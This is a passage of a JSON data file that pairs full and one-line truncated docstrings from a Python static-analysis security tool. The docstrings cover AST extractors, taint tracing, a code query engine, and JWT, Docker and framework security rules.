    "original": "\"\"\"Extract lambda function definitions with closure detection.\n\n    Detects:\n    - Lambda expressions: lambda x: x + 1\n    - Multi-parameter lambdas: lambda x, y: x + y\n    - Closure captures: lambda x: x + outer_var\n    - Usage context: map, filter, sorted, direct assignment\n\n    Args:\n        tree: AST tree dictionary with 'tree' key\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of lambda dicts:\n        {\n            'line': int,\n            'parameters': List[str],  # ['x', 'y']\n            'parameter_count': int,\n            'body': str,  # Body expression as text\n            'captures_closure': bool,  # True if references outer variables\n            'captured_vars': List[str],  # Variables from outer scope\n            'used_in': str,  # 'map' | 'filter' | 'sorted_key' | 'assignment' | 'argument'\n            'in_function': str,\n        }\n\n    Enables curriculum: Chapter 8 - Lambda functions and closures\n    \"\"\"",
    "truncated": "\"\"\"Extract lambda function definitions with closure detection.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 27,
    "original": "\"\"\"Query findings from findings_consolidated table.\n\n        Direct SQL query on findings table - fast and no truncation limits.\n\n        Args:\n            file_path: Filter by file path (partial match supported)\n            tool: Filter by tool (patterns, taint, eslint, cfg-analysis, etc.)\n            severity: Filter by severity (CRITICAL, HIGH, MEDIUM, LOW, INFO)\n            rule: Filter by rule name (partial match supported)\n            category: Filter by category\n\n        Returns:\n            List of finding dicts with file, line, rule, tool, message, severity, etc.\n\n        Example:\n            # Get all HIGH severity findings\n            findings = engine.get_findings(severity='HIGH')\n\n            # Get taint findings in auth files\n            findings = engine.get_findings(file_path='auth', tool='taint')\n\n            # Get specific pattern rule\n            findings = engine.get_findings(rule='sql-injection')\n\n        Raises:\n            None - gracefully returns empty list if table missing\n        \"\"\"",
    "truncated": "\"\"\"Query findings from findings_consolidated table.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 27,
    "original": "\"\"\"Search symbols by pattern (LIKE query).\n\n        Faster than Compass's vector similarity (no ML, no CUDA).\n        Uses SQL LIKE for instant pattern matching.\n\n        Args:\n            pattern: Search pattern (supports % wildcards)\n            type_filter: Filter by symbol type (function, class, etc.)\n            path_filter: Filter by file path (supports % wildcards)\n            limit: Maximum results to return\n\n        Returns:\n            List of matching symbols\n\n        Example:\n            # Find all auth-related functions\n            results = engine.pattern_search(\"auth%\", type_filter=\"function\")\n\n            # Find all validation code\n            results = engine.pattern_search(\"%valid%\")\n\n            # Find all controllers in src/api/\n            results = engine.pattern_search(\"%Controller%\", path_filter=\"src/api/%\")\n\n            # List everything in a path\n            results = engine.pattern_search(\"%\", path_filter=\"services/%\")\n        \"\"\"",
    "truncated": "\"\"\"Search symbols by pattern (LIKE query).\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 27,
    "original": "\"\"\"Query engine for code navigation.\n\n    Uses existing database tables - NO new schema required.\n    All queries return exact matches with provenance.\n\n    Database Schema Used:\n        repo_index.db:\n            - symbols (33k rows) - symbol.path NOT symbol.file!\n            - symbols_jsx (8k rows)\n            - function_call_args (13k rows)\n            - function_call_args_jsx (4k rows)\n            - variable_usage (57k rows)\n            - assignments (6k rows)\n            - api_endpoints (185 rows)\n            - react_components (1k rows)\n            - react_hooks (667 rows)\n            - refs (1.7k rows)\n\n        graphs.db:\n            - edges (7.3k rows) - import + call relationships\n            - nodes (4.8k rows)\n\n    Performance:\n        - Symbol lookup: <5ms (indexed)\n        - Direct callers: <10ms\n        - Transitive (depth=3): <50ms\n    \"\"\"",
    "truncated": "\"\"\"Query engine for code navigation.\"\"\""
  },
  {
    "file": "theauditor/fce.py",
    "line": -1,
    "original_lines": 27,
    "original": "\"\"\"\n    Load GraphQL security findings from graphql_findings_cache table.\n\n    Queries graphql_findings_cache for pre-computed GraphQL security findings\n    generated by GraphQL security rules. This enables FCE to correlate GraphQL\n    vulnerabilities with taint paths and other security findings.\n\n    Args:\n        db_path: Path to repo_index.db database\n\n    Returns:\n        List of GraphQL finding dicts with vulnerability metadata\n\n    Performance:\n        - O(n) where n = number of GraphQL findings\n        - ~5-20ms for 10-100 findings (indexed query + deserialization)\n\n    Data Structure:\n        Each GraphQL finding contains:\n        - finding_type: Type of GraphQL vulnerability (mutation_auth, query_depth, etc.)\n        - schema_file: GraphQL schema file path\n        - field_path: Qualified field path (Type.field)\n        - severity: critical|high|medium|low\n        - confidence: high|medium|low\n        - description: Human-readable finding description\n        - metadata: Rule-specific data (field_name, type_name, etc.)\n    \"\"\"",
    "truncated": "\"\"\"Load GraphQL security findings from graphql_findings_cache table.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/graphs_schema.py",
    "line": -1,
    "original_lines": 27,
    "original": "\"\"\"\nGraph database schema definitions - Used by graphs.db ONLY.\n\nThis module contains table schemas for the separate graphs.db database:\n- Graph nodes (modules, functions, variables)\n- Graph edges (imports, calls, data flow)\n- Analysis results (cycles, hotspots, layers)\n\nDesign Philosophy:\n- Physically separate database from repo_index.db (different query patterns)\n- Optimized for bidirectional graph traversal (dual indexes on source/target)\n- Denormalized metadata (JSON blobs for flexible graph properties)\n- Polymorphic graph_type column (single tables for import/call/data_flow graphs)\n- NOT included in main TABLES registry (separate lifecycle)\n\nPerformance Features:\n- Bidirectional edge indexes (idx_edges_source + idx_edges_target)\n- Composite UNIQUE constraint creates automatic covering index\n- Denormalized metadata avoids excessive JOINs\n- Timestamp tracking for incremental analysis\n\nDatabase Locations:\n- graphs.db: .pf/graphs.db (opt-in, built via `aud graph build`)\n- repo_index.db: .pf/repo_index.db (automatic, built via `aud index`)\n\nSee: CLAUDE.md \"WHY TWO DATABASES\" section for architectural rationale\n\"\"\"",
    "truncated": "\"\"\"Graph database schema definitions - Used by graphs.db ONLY.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/utils.py",
    "line": -1,
    "original_lines": 27,
    "original": "\"\"\"Represents a complete table schema.\n\n    Design Pattern - Foreign Key Constraints:\n        Foreign keys serve TWO purposes in this schema:\n\n        1. JOIN Query Generation (NEW):\n           The foreign_keys field provides metadata for build_join_query() to:\n           - Validate JOIN conditions reference correct tables/columns\n           - Auto-generate proper JOIN ON clauses\n           - Enable type-safe relational queries\n\n        2. Database Integrity (UNCHANGED):\n           Actual FOREIGN KEY constraints in CREATE TABLE statements are still\n           defined exclusively in database.py. This separation maintains backward\n           compatibility and avoids circular dependencies during table creation.\n\n        The foreign_keys field is OPTIONAL and backward compatible. Tables without\n        foreign keys can still be queried normally with build_query().\n\n    Attributes:\n        name: Table name\n        columns: List of column definitions\n        indexes: List of (index_name, [column_names]) tuples\n        primary_key: Composite primary key column list (for multi-column PKs)\n        unique_constraints: List of UNIQUE constraint column lists\n        foreign_keys: List of ForeignKey definitions (for JOIN generation)\n    \"\"\"",
    "truncated": "\"\"\"Represents a complete table schema.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 27,
    "original": "\"\"\"Native vulnerability scanners wrapper for npm audit and OSV-Scanner.\n\nThis module runs native security tools, cross-references findings for validation,\nand writes to both database and JSON.\n\nArchitecture:\n- Reads packages from package_configs table (populated by indexer)\n- Runs 2 detection sources in parallel:\n  * npm audit (sandboxed node runtime)\n  * osv-scanner (Google's official OSV.dev scanner)\n- Cross-references findings for confidence scoring\n- Writes to findings_consolidated table (for FCE correlation)\n- Writes to JSON (for AI readability)\n\nCross-Reference Strategy:\n- Group findings by vulnerability ID (CVE/GHSA)\n- Confidence = # of sources that found it\n- Severity = highest when sources disagree\n- Flag discrepancies for review\n\nOSV-Scanner Facts (DO NOT HALLUCINATE):\n- Binary location: .auditor_venv/.theauditor_tools/osv-scanner/osv-scanner.exe (Windows)\n- Offline database: .auditor_venv/.theauditor_tools/osv-scanner/db/{ecosystem}/all.zip\n- Usage: osv-scanner scan -L package-lock.json --format json --offline-vulnerabilities\n- Database download: --download-offline-databases flag\n- No rate limits (offline database)\n\"\"\"",
    "truncated": "\"\"\"Native vulnerability scanners wrapper for npm audit and OSV-Scanner.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/behavioral_extractors.py",
    "line": -1,
    "original_lines": 26,
    "original": "\"\"\"Detect recursion patterns including direct, mutual, and tail recursion.\n\n    Detects:\n    - Direct recursion: function calls itself\n    - Mutual recursion: function A calls B, B calls A\n    - Tail recursion: recursive call is last operation (return recursive_call())\n    - Base cases: conditions that stop recursion\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of recursion pattern dicts:\n        {\n            'line': int,\n            'function_name': str,\n            'recursion_type': str,  # 'direct' | 'tail' | 'mutual'\n            'calls_function': str,  # Function being called (same as function_name for direct)\n            'base_case_line': int | None,  # Line number of base case condition\n            'is_async': bool,\n        }\n\n    Enables hypothesis: \"Function X uses recursion with base case Y\"\n    Experiment design: Call X with known input, verify recursive behavior and termination\n    \"\"\"",
    "truncated": "\"\"\"Detect recursion patterns including direct, mutual, and tail recursion.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/behavioral_extractors.py",
    "line": -1,
    "original_lines": 26,
    "original": "\"\"\"Extract property patterns including computed properties and validated setters.\n\n    Detects:\n    - @property getters (computed properties)\n    - @property.setter setters (with validation)\n    - @property.deleter deleters\n    - Computed properties (getters with logic, not just return self._x)\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of property pattern dicts:\n        {\n            'line': int,\n            'property_name': str,\n            'access_type': str,  # 'getter' | 'setter' | 'deleter'\n            'in_class': str,  # Class name containing property\n            'has_computation': bool,  # True if getter has computation (not just return self._x)\n            'has_validation': bool,  # True if setter has validation (if/raise)\n        }\n\n    Enables hypothesis: \"Property X computes value rather than returning stored attribute\"\n    Experiment design: Access property, verify computation occurs vs simple attribute return\n    \"\"\"",
    "truncated": "\"\"\"Extract property patterns including computed properties and validated setters.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/data_flow_extractors.py",
    "line": -1,
    "original_lines": 26,
    "original": "\"\"\"Track how function parameters influence return values.\n\n    Detects:\n    - Direct returns: return param\n    - Transformed returns: return param * 2\n    - Conditional returns: return a if condition else b\n    - No data flow: return constant (no parameter reference)\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of parameter flow dicts:\n        {\n            'line': int,\n            'function_name': str,\n            'parameter_name': str,  # Parameter referenced in return\n            'return_expr': str,  # Full return expression\n            'flow_type': str,  # 'direct' | 'transformed' | 'conditional' | 'none'\n            'is_async': bool,\n        }\n\n    Enables hypothesis: \"Function X returns transformed parameter Y\"\n    Experiment design: Call X with param=5, assert return value = 10 (if transform is *2)\n    \"\"\"",
    "truncated": "\"\"\"Track how function parameters influence return values.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/performance_extractors.py",
    "line": -1,
    "original_lines": 26,
    "original": "\"\"\"Detect loop complexity patterns indicating algorithmic performance.\n\n    Detects:\n    - Nested loops (nesting level 2, 3, 4+)\n    - Growing operations in loops (append, extend, +=)\n    - Loop types (for, while, comprehensions)\n    - Estimated complexity (O(n), O(n²), O(n³))\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of loop complexity dicts:\n        {\n            'line': int,\n            'loop_type': str,  # 'for' | 'while' | 'comprehension'\n            'nesting_level': int,  # 1, 2, 3, 4+\n            'has_growing_operation': bool,  # True if contains append/extend/+=\n            'in_function': str,\n            'estimated_complexity': str,  # 'O(n)' | 'O(n^2)' | 'O(n^3)' | 'O(n^4+)'\n        }\n\n    Enables hypothesis: \"Function X has O(n²) complexity\"\n    Experiment design: Test with varying input sizes, measure execution time\n    \"\"\"",
    "truncated": "\"\"\"Detect loop complexity patterns indicating algorithmic performance.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/performance_extractors.py",
    "line": -1,
    "original_lines": 26,
    "original": "\"\"\"Detect memoization patterns and missing opportunities.\n\n    Detects:\n    - @lru_cache decorator usage\n    - @cache decorator usage (Python 3.9+)\n    - Manual cache dictionaries (module-level _cache = {})\n    - Recursive functions without memoization (opportunity)\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of memoization pattern dicts:\n        {\n            'line': int,\n            'function_name': str,\n            'has_memoization': bool,  # True if memoization present\n            'memoization_type': str,  # 'lru_cache' | 'cache' | 'manual' | 'none'\n            'is_recursive': bool,  # True if function is recursive\n            'cache_size': int | None,  # LRU cache size if specified\n        }\n\n    Enables hypothesis: \"Function X would benefit from memoization\"\n    Experiment design: Test performance with/without memoization, measure speedup\n    \"\"\"",
    "truncated": "\"\"\"Detect memoization patterns and missing opportunities.\"\"\""
  },
  {
    "file": "theauditor/fce.py",
    "line": -1,
    "original_lines": 26,
    "original": "\"\"\"\n    Load GitHub Actions workflow security findings from database.\n\n    Queries findings_consolidated for tool='github-actions-rules' and deserializes\n    workflow vulnerability data from details_json column. This enables FCE to\n    correlate workflow risks with taint paths (e.g., secret exposure via PR injection).\n\n    Args:\n        db_path: Path to repo_index.db database\n\n    Returns:\n        List of workflow finding dicts with rule-specific vulnerability data\n\n    Performance:\n        - O(n) where n = number of workflow findings\n        - ~5-20ms for 10-100 findings (indexed query + JSON deserialization)\n\n    Data Structure:\n        Each workflow finding contains:\n        - workflow: Workflow file path (.github/workflows/*.yml)\n        - workflow_name: Human-readable workflow name\n        - rule: Specific vulnerability type (untrusted_checkout_sequence, etc.)\n        - severity: critical|high|medium|low\n        - category: supply-chain|injection|access-control\n        - details: Rule-specific data (job keys, permissions, references, etc.)\n    \"\"\"",
    "truncated": "\"\"\"Load GitHub Actions workflow security findings from database.\"\"\""
  },
  {
    "file": "theauditor/rules/TEMPLATE_JSX_RULE.py",
    "line": -1,
    "original_lines": 26,
    "original": "\"\"\"Detect JSX-specific security issues using preserved JSX data.\n\n    CRITICAL: This rule queries JSX-SPECIFIC TABLES:\n    - symbols_jsx (NOT symbols)\n    - assignments_jsx (NOT assignments)\n    - function_call_args_jsx (NOT function_call_args)\n\n    Detection Strategy:\n    1. Verify this is a React/Vue app (check frameworks table)\n    2. Query symbols_jsx for JSX elements with dangerous patterns\n    3. Check assignments_jsx for user input flowing to JSX props\n    4. Validate against framework safe sinks\n\n    Database Tables Used:\n    - symbols_jsx: JSX elements in preserved syntax\n    - assignments_jsx: Variable assignments in JSX context\n    - function_call_args_jsx: Function calls within JSX\n    - react_components: Component metadata\n    - frameworks: Framework detection\n\n    Args:\n        context: Rule execution context\n\n    Returns:\n        List of JSX-specific security findings\n    \"\"\"",
    "truncated": "\"\"\"Detect JSX-specific security issues using preserved JSX data.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 26,
    "original": "\"\"\"Backward trace from sink, checking if ANY source is reachable.\n\n        PHASE 6.1 CHANGE (Goal B - Full Provenance):\n        Now returns (vulnerable_paths, sanitized_paths) tuple.\n\n        CRITICAL ARCHITECTURAL CHANGE: Source matches are now WAYPOINTS, not termination points.\n        Paths are recorded ONLY at max_depth or natural termination (no predecessors).\n        This captures the COMPLETE call chain (8-10 hops) instead of stopping at first source (2-3 hops).\n\n        Algorithm:\n        1. Start at sink (backward analysis)\n        2. Query graphs.db for data dependencies (backward edges)\n        3. Follow edges backward through assignments, calls, returns, middleware\n        4. When source is matched, ANNOTATE it (store matched_source in worklist state)\n        5. CONTINUE exploring to max_depth (DO NOT terminate early)\n        6. Record path ONLY when exploration terminates (max_depth OR no predecessors)\n        7. Classify path as vulnerable or sanitized based on sanitizer presence\n\n        Args:\n            sink: Sink dict\n            source_aps: List of (source_dict, AccessPath) tuples\n            max_depth: Maximum hops\n\n        Returns:\n            Tuple of (vulnerable_paths, sanitized_paths)\n        \"\"\"",
    "truncated": "\"\"\"Backward trace from sink, checking if ANY source is reachable.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/behavioral_extractors.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"Extract dynamic attribute access patterns (__getattr__, __setattr__, __getattribute__).\n\n    Detects:\n    - __getattr__ implementation (fallback attribute access)\n    - __setattr__ implementation (attribute assignment interception)\n    - __getattribute__ implementation (all attribute access interception)\n    - __delattr__ implementation (attribute deletion)\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of dynamic attribute dicts:\n        {\n            'line': int,\n            'method_name': str,  # '__getattr__' | '__setattr__' | '__getattribute__' | '__delattr__'\n            'in_class': str,  # Class name containing method\n            'has_delegation': bool,  # True if method delegates to another object\n            'has_validation': bool,  # True if method validates (for setattr)\n        }\n\n    Enables hypothesis: \"Class uses dynamic attribute interception\"\n    Experiment design: Access/set attributes on instance, verify interception occurs\n    \"\"\"",
    "truncated": "\"\"\"Extract dynamic attribute access patterns (__getattr__, __setattr__, __getattribute__).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/exception_flow_extractors.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"Extract exception handlers (except clauses) and their handling strategies.\n\n    Detects:\n    - except ValueError as e: ...\n    - except (TypeError, ValueError): ...\n    - except Exception: ...\n    - Multiple except clauses for same try block\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of exception handler dicts:\n        {\n            'line': int,\n            'exception_types': str,  # 'ValueError,TypeError' (comma-separated)\n            'variable_name': str | None,  # 'e' in 'as e'\n            'handling_strategy': str,  # 'return_none' | 're_raise' | 'log_and_continue' | etc.\n            'in_function': str,\n        }\n\n    Enables hypothesis: \"Function X converts ValueError to None\"\n    Experiment design: Call X with invalid input, assert returns None instead of raising\n    \"\"\"",
    "truncated": "\"\"\"Extract exception handlers (except clauses) and their handling strategies.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/performance_extractors.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"Detect resource usage patterns that may impact performance.\n\n    Detects:\n    - Large data structure allocations (list/dict/set with >1000 elements)\n    - File handles without context managers\n    - Database connections without cleanup\n    - Large string concatenations\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of resource usage dicts:\n        {\n            'line': int,\n            'resource_type': str,  # 'large_list' | 'large_dict' | 'file_handle' | 'db_connection' | 'string_concat'\n            'allocation_expr': str,  # Expression that allocates resource\n            'in_function': str,\n            'has_cleanup': bool,  # True if resource cleanup is present\n        }\n\n    Enables hypothesis: \"Function X allocates large memory structures\"\n    Experiment design: Measure memory usage before/after function call\n    \"\"\"",
    "truncated": "\"\"\"Detect resource usage patterns that may impact performance.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/state_mutation_extractors.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"Extract instance attribute mutations (self.x = value).\n\n    Detects:\n    - Direct assignment: self.counter = 0\n    - Augmented assignment: self.counter += 1\n    - Nested attributes: self.config.debug = True\n    - Method calls with side effects: self.items.append(x)\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of instance mutation dicts:\n        {\n            'line': int,\n            'target': str,  # 'self.counter'\n            'operation': 'assignment' | 'augmented_assignment' | 'method_call',\n            'in_function': str,  # Function name where mutation occurs\n            'is_init': bool,  # True if in __init__ (expected mutation)\n        }\n\n    Enables hypothesis: \"Function X modifies instance attribute Y\"\n    Experiment design: Call X, check object.Y before/after\n    \"\"\"",
    "truncated": "\"\"\"Extract instance attribute mutations (self.x = value).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"TypeScript/JavaScript Structural AST Extraction Layer.\n\nThis module is Part 1 of the TypeScript implementation layer split.\n\nRESPONSIBILITY: Structural Extraction (Stateless AST Traversal)\n=================================================================\n\nCore Components:\n- AST Utilities: Node traversal, name extraction, member resolution\n- JSX Detection: Complete JSX node recognition for React analysis\n- Scope Mapping: build_scope_map() - THE FOUNDATION for behavioral analysis\n- Structural Extractors: Functions, classes, calls, imports, exports, properties\n\nARCHITECTURAL CONTRACT:\n- NO file_path context (3-layer architecture: INDEXER provides file paths)\n- NO behavioral analysis (assignments, returns, CFG belong in typescript_impl.py)\n- Stateless operations only (no scope-dependent context)\n\nCONSUMERS:\n- typescript_impl.py (behavioral analysis layer)\n- ast_extractors/__init__.py (orchestrator router)\n\nCRITICAL: build_scope_map (line ~353) fixes \"100% anonymous caller\" bug\nby providing O(1) line-to-function lookups for accurate scope resolution.\n\"\"\"",
    "truncated": "\"\"\"TypeScript/JavaScript Structural AST Extraction Layer.\"\"\""
  },
  {
    "file": "theauditor/boundaries/boundary_analyzer.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"Input Validation Boundary Analyzer.\n\nDetects where external input enters the system and measures distance to validation.\n\nBoundary Definition:\n    - Entry Points: HTTP routes, CLI commands, file uploads, message handlers\n    - Control Points: Schema validation, type checks, sanitizers\n    - Violation: Entry point uses external data before validation\n\nExamples of Violations:\n\n    BAD (distance = 3):\n        @app.post('/user')\n        def create_user(request):           # ← Entry (req.body untrusted)\n            user_service.create(request.json)   # ← Distance 1 (no validation yet!)\n                def create(data):\n                    db.insert('users', data)    # ← Distance 2 (STILL no validation!)\n                        def insert(table, data):\n                            validate(data)      # ← Distance 3 (TOO LATE! Data already in DB layer)\n\n    GOOD (distance = 0):\n        @app.post('/user')\n        def create_user(data: UserSchema):  # ← Validation IN signature (distance 0)\n            db.insert('users', data)        # ← Safe! Already validated\n\"\"\"",
    "truncated": "\"\"\"Input Validation Boundary Analyzer.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"Get data dependencies (reads/writes) for a function.\n\n        Uses assignments table (HAS in_function column).\n        NOT variable_usage (that has in_component for React components).\n\n        Data flow analysis:\n        - READS: Variables consumed by the function (from source_vars JSON array)\n        - WRITES: Variables assigned by the function (target_var)\n\n        Args:\n            symbol_name: Function name to analyze\n\n        Returns:\n            Dict with 'reads' and 'writes' lists\n\n        Example:\n            deps = engine.get_data_dependencies(\"createApp\")\n            for read in deps['reads']:\n                print(f\"Reads: {read['variable']}\")\n            for write in deps['writes']:\n                print(f\"Writes: {write['variable']} = {write['expression']}\")\n\n        Raises:\n            ValueError: If symbol_name is empty\n        \"\"\"",
    "truncated": "\"\"\"Get data dependencies (reads/writes) for a function.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"Trace variable through def-use chains using assignment_sources.\n\n        Uses BFS traversal through assignment_sources junction table to find\n        how variables flow through assignments (X = Y → Z = X → A = Z).\n\n        This is PURE DATA FLOW analysis (what data moves where), complementing\n        get_callers() which is CONTROL FLOW analysis (who calls what).\n\n        Args:\n            var_name: Variable name to trace\n            from_file: Starting file path (can be partial)\n            depth: Traversal depth (1-5, default=3)\n\n        Returns:\n            List of flow step dicts with from_var, to_var, expression, file, line, depth\n\n        Example:\n            # Trace how userToken flows through code\n            flow = engine.trace_variable_flow(\"userToken\", \"auth.ts\", depth=3)\n            for step in flow:\n                print(f\"{step['from_var']} -> {step['to_var']} at {step['file']}:{step['line']}\")\n\n        Raises:\n            ValueError: If depth < 1 or depth > 5 or var_name empty\n        \"\"\"",
    "truncated": "\"\"\"Trace variable through def-use chains using assignment_sources.\"\"\""
  },
  {
    "file": "theauditor/graph/db_cache.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"Graph database cache layer - Solves N+1 query problem.\n\nLoads all file paths, imports, and exports into memory ONCE at initialization,\nconverting 50,000 database round-trips into 1 bulk query.\n\nArchitecture:\n- Guardian of Hygiene: Normalizes all paths internally (Windows/Unix compatible)\n- Zero Fallback Policy: Crashes if database missing or malformed\n- Single Responsibility: Data access layer only (no business logic)\n\n2025 Standard: Batch loading for performance.\n\nExample:\n    >>> cache = GraphDatabaseCache(Path(\".pf/repo_index.db\"))\n    [GraphCache] Loaded 360 files, 1243 import records, 892 export records\n\n    >>> cache.file_exists(\"theauditor\\\\cli.py\")  # Windows path\n    True\n    >>> cache.file_exists(\"theauditor/cli.py\")   # Unix path\n    True\n\n    >>> imports = cache.get_imports(\"theauditor/main.py\")\n    >>> len(imports)\n    15\n\"\"\"",
    "truncated": "\"\"\"Graph database cache layer - Solves N+1 query problem.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/jwt_analyze.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"JWT Security Detector - Full-Stack Database-First Approach.\n\nComprehensive JWT security coverage for React/Vite/Node.js/Python stacks.\nNO AST TRAVERSAL. NO STRING PARSING. JUST SQL QUERIES.\n\nBackend Detection (queries actual function names):\n- Hardcoded secrets: jwt.sign(), jsonwebtoken.sign(), jose.JWT.sign(), jwt.encode()\n- Weak variable secrets: Checks argument patterns for obvious weaknesses\n- Missing expiration claims: Checks for expiresIn/exp/maxAge in options\n- Algorithm confusion: Detects mixed symmetric/asymmetric algorithms\n- None algorithm usage: Detects 'none' in algorithm options (critical vulnerability)\n- JWT.decode() usage: Detects decode without signature verification\n\nFrontend Detection (assignments & function_call_args):\n- localStorage/sessionStorage JWT storage (XSS vulnerability)\n- JWT in URL parameters (leaks to logs/history/referrer)\n- Cross-origin JWT transmission (CORS issues)\n- React useState/useContext JWT patterns (UX issues)\n\nKNOWN LIMITATIONS:\n- Won't detect destructured imports: import { sign } from 'jwt'; sign();\n- Won't detect renamed imports: import { sign as jwtSign } from 'jwt';\n- Library coverage: jwt, jsonwebtoken, jose, PyJWT (expand as needed)\n- For comprehensive coverage, combine with dependency analysis\n\"\"\"",
    "truncated": "\"\"\"JWT Security Detector - Full-Stack Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/docker_analyze.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"Detect Dockerfile security misconfigurations using indexed data.\n\n    Detection Strategy:\n    1. Query docker_images table for all Dockerfiles\n    2. Check USER instruction (root user detection)\n    3. Scan ENV/ARG for hardcoded secrets\n    4. Validate base image versions\n    5. Check for missing HEALTHCHECK\n    6. Detect sensitive ports exposed\n    7. Optional: Scan base images for CVEs\n\n    Database Tables Used:\n    - docker_images: Dockerfile metadata (USER, ENV, ARG, base_image, exposed_ports, has_healthcheck)\n\n    Args:\n        context: Rule execution context with database path\n\n    Returns:\n        List of findings for detected security issues\n\n    Known Limitations:\n    - Multi-stage builds: Only checks final USER instruction\n    - ARG secrets: Detects but cannot prevent build-time exposure\n    - CVE scanning: Requires network access (optional)\n    \"\"\"",
    "truncated": "\"\"\"Detect Dockerfile security misconfigurations using indexed data.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/__init__.py",
    "line": -1,
    "original_lines": 25,
    "original": "\"\"\"Framework Security Analyzers.\n\nDatabase-first framework-specific security rules for:\n- Express.js (Backend, 10 checks)\n- FastAPI (Backend, 11 checks)\n- Flask (Backend, 13 checks)\n- Next.js (Full-stack, 8 checks)\n- React (Frontend, 12 checks)\n- Vue.js (Frontend, 8 checks)\n\nTotal: 62 security patterns across 6 frameworks.\n\nAll rules follow schema contract architecture (v1.1+):\n- NO file I/O operations\n- Pure SQL queries against repo_index.db\n- Frozenset patterns for O(1) lookups\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Standardized contracts (StandardRuleContext -> List[StandardFinding])\n\nOrchestrator Discovery:\n- All rules exported with `find_*_issues` naming convention\n- Functions starting with `find_` are auto-discovered\n- Import this module to access all framework analyzers\n\"\"\"",
    "truncated": "\"\"\"Framework Security Analyzers.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/data_flow_extractors.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"Identify variables captured from outer scope (closures).\n\n    Detects:\n    - Nested functions accessing outer variables\n    - Lambda functions capturing variables\n    - Variables from enclosing function scope\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of closure capture dicts:\n        {\n            'line': int,\n            'inner_function': str,  # Nested function name\n            'captured_variable': str,  # Variable from outer scope\n            'outer_function': str,  # Enclosing function name\n            'is_lambda': bool,  # True if inner function is lambda\n        }\n\n    Enables hypothesis: \"Function X depends on outer variable Y\"\n    Experiment design: Call X with different outer variable values, verify behavior changes\n    \"\"\"",
    "truncated": "\"\"\"Identify variables captured from outer scope (closures).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_advanced_extractors.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"\n    Extract Django QuerySet method definitions and chains.\n\n    Detects:\n    - QuerySet subclasses\n    - Custom queryset methods\n    - Queryset method chains (.filter().exclude().order_by())\n    - as_manager() pattern\n\n    Security relevance:\n    - QuerySets define data access boundaries\n    - Custom filters may have security implications\n    - Method chaining can bypass security checks\n    - as_manager() exposes queryset methods on model\n\n    Returns:\n        List of dicts with keys:\n        - line: int\n        - queryset_name: str\n        - base_class: str (QuerySet)\n        - custom_methods: str (JSON array of method names)\n        - has_as_manager: bool\n        - method_chain: str (optional - for queryset chains)\n    \"\"\"",
    "truncated": "\"\"\"Extract Django QuerySet method definitions and chains.\"\"\""
  },
  {
